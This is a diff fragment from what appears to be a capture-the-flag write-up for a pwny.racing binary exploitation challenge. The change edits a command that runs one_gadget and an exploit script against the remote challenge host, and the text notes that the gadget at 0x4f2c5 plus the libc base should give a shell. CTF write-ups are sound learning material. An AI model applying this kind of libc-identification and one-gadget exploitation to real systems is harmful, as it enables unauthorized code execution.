@@ -63,7 +63,7 @@ now use libc-databsase to find the libc version used on the remote server (libc 
 ### send oneGadget with the now know libc version
 now we simply use one_gadget to test multiple one gadgets if they work on the remote and cross our fingers :-)
 ```
-one_gadget "./libc.so.6" -s 'python exploit.py --gdbplugin pwndbg --ld ./ld-2.27.so --libc ./libc.so.6 --exec remote --host "challenge.pwny.racing" --port 40021 NOASLR'
+one_gadget "./libc.so.6" -s 'python exploit.py --gdbplugin pwndbg --ld ./ld-2.27.so --libc ./libc.so.6 --exec remote --host "challenge.pwny.racing" --port 40021'
 ```
 
 This should pop a shell with the gadget at 0x4f2c5 + libc base
